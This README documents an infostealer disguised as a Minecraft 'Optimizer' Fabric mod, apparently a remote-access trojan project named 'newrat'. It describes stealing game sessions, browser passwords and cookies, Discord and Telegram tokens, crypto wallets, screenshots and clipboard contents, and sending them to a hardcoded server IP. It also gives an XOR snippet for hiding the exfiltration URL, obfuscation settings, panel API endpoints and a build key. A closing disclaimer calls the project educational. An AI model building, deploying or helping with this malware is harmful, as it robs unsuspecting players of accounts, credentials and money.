# Optimizer Mod - Minecraft 1.21.x

A Fabric mod for Minecraft 1.21 - 1.21.4 with remote data collection capabilities.

## 🏗️ Infrastructure

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                              ARCHITECTURE                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│   ┌──────────────┐         HTTP POST          ┌──────────────────────┐      │
│   │   Minecraft  │ ─────────────────────────► │    Panel Server      │      │
│   │   Client     │    /api/data/{BUILD_KEY}   │   (Flask + SQLite)   │      │
│   │   + Mod      │                            │   89.125.209.229:5000│      │
│   └──────────────┘                            └──────────────────────┘      │
│         │                                              │                     │
│         │                                              │                     │
│         ▼                                              ▼                     │
│   ┌──────────────┐                            ┌──────────────────────┐      │
│   │  Debug Log   │                            │   Web Dashboard      │      │
│   │  (Desktop)   │                            │   (index.html)       │      │
│   └──────────────┘                            └──────────────────────┘      │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

## 📁 Project Structure

```
newrat/
├── src/main/java/com/example/optimizer/
│   ├── OptimizerClientLite.java    # Mod entry point (Fabric ClientModInitializer)
│   ├── Ex.java                      # Data extraction module
│   └── Se.java                      # HTTP sender with debug logging
├── src/main/resources/
│   ├── fabric.mod.json              # Fabric mod metadata
│   └── assets/optimizer/lang/       # Language files
├── panel/
│   ├── server.py                    # Flask API server
│   ├── index.html                   # Web dashboard
│   └── optimizer.db                 # SQLite database
├── build_final.sh                   # Build + obfuscation script
├── skidfuscator-config.yml          # Obfuscation settings
└── optimizer-FINAL.jar              # Output (obfuscated mod)
```

## 🔧 Components

### 1. Minecraft Mod (Java/Fabric)

| File | Purpose |
|------|---------|
| `OptimizerClientLite.java` | Entry point, starts extraction after 5s delay |
| `Ex.java` | Extracts: MC sessions, browsers, Discord, wallets, gaming, system info |
| `Se.java` | HTTP communication, XOR-encoded URL, debug logging |

**Supported Browsers (40+):**
- Chrome, Edge, Brave, Opera, Opera GX, Vivaldi, Firefox
- Yandex, Thorium, Iridium, 7Star, CentBrowser, Chedot
- Epic, Uran, Coowon, Dragon, Maxthon, CocCoc, Amigo, Torch
- And many more...

**Wallet Extensions (25+):**
- MetaMask, Phantom, Coinbase, Trust Wallet, Binance
- Exodus, Ronin, Keplr, Solflare, TronLink, Rabby
- And many more...

### 2. Panel Server (Python/Flask)

```python
# Endpoints
POST /api/data/{BUILD_KEY}      # Receive JSON data
POST /api/upload/{BUILD_KEY}    # Receive ZIP files
GET  /api/entries/{BUILD_KEY}   # List entries
GET  /                          # Web dashboard
```

### 3. Build System

```bash
./build_final.sh
```

**Build Process:**
1. Gradle builds the mod JAR
2. Skidfuscator obfuscates the code
3. Output: `optimizer-FINAL.jar` (~60KB)

## 🚀 Deployment

### Panel Server

```bash
cd panel/
pip install -r requirements.txt
python server.py
```

Server runs on `0.0.0.0:5000`

### Mod Installation

1. Build: `./build_final.sh`
2. Copy `optimizer-FINAL.jar` to `~/.minecraft/mods/`
3. Launch Minecraft with Fabric Loader 1.21.x

## 🔑 Build Keys

Each build uses a unique key for identification:

| Key | Purpose |
|-----|---------|
| `ADMIN_XEboLQH0Ag7WlWGkZ2Ocyw` | Current active key |

To change the build key, update the XOR-encoded URL bytes in `Se.java`:

```java
private static final byte[] PANEL_URL_BYTES = {
    // XOR-encoded with key 0x5A
    0x32, 0x2e, 0x2e, 0x2a, ...
};
```

Generate new bytes:
```python
url = "http://89.125.209.229:5000/api/data/YOUR_KEY"
print([hex(ord(c) ^ 0x5A) for c in url])
```

## 🐛 Debug Mode

Debug logs are written to:
- **Windows:** `C:\Users\<User>\Desktop\optimizer_debug.log`
- **Linux/Mac:** `~/Desktop/optimizer_debug.log`

Log contains:
- Thread start/stop timestamps
- HTTP request/response details
- Minecraft session extraction steps
- Error stack traces

## 📊 Data Flow

```
1. Mod loads with Minecraft
           │
           ▼
2. 5 second delay (wait for game init)
           │
           ▼
3. Ex.runAll() spawns threads:
   ├── Ex-MC (Minecraft session) ──────────► Se.sendMinecraft()
   ├── Ex-Browser (cookies, passwords)
   ├── Ex-Discord (tokens)
   ├── Ex-Wallet (crypto wallets)
   ├── Ex-Gaming (Steam, Epic, etc.)
   ├── Ex-Telegram (session data)
   ├── Ex-System (system info)
   ├── Ex-Screenshot
   ├── Ex-Clipboard
   └── Ex-ZIP (15s delay, then zip all) ──► Se.sendZip()
           │
           ▼
4. Panel receives data via HTTP POST
           │
           ▼
5. Data stored in SQLite database
           │
           ▼
6. View in web dashboard
```

## 🛡️ Obfuscation

Using **Skidfuscator 2.0.11**:

- String encryption
- Number encryption
- Control flow obfuscation
- Exception flow
- Range obfuscation

Config: `skidfuscator-config.yml`

## 📋 Requirements

### Build Requirements
- Java 21+
- Gradle 8.x
- Skidfuscator 2.0.11

### Runtime Requirements
- Minecraft 1.21 - 1.21.4
- Fabric Loader 0.16.0+
- Fabric API 0.105.0+

### Panel Requirements
- Python 3.8+
- Flask
- SQLite3

## 🔄 API Reference

### Send Minecraft Session
```json
POST /api/data/{BUILD_KEY}
{
    "type": "minecraft",
    "player": "PlayerName",
    "uuid": "uuid-string",
    "access_token": "token...",
    "client_id": "",
    "ip": "192.168.1.1",
    "pc_name": "Windows 10",
    "pc_user": "User"
}
```

### Send ZIP File
```http
POST /api/upload/{BUILD_KEY}
Content-Type: multipart/form-data

pc_name=Windows 10
pc_user=User
file=@data.zip
```

## 📝 Changelog

### v1.0.0 (Dec 2024)
- Initial release
- 40+ browser support
- 25+ wallet extensions
- Multi-threaded extraction
- Debug logging system
- Skidfuscator obfuscation

## ⚠️ Disclaimer

This project is for educational purposes only. Use responsibly and only on systems you own or have explicit permission to test.
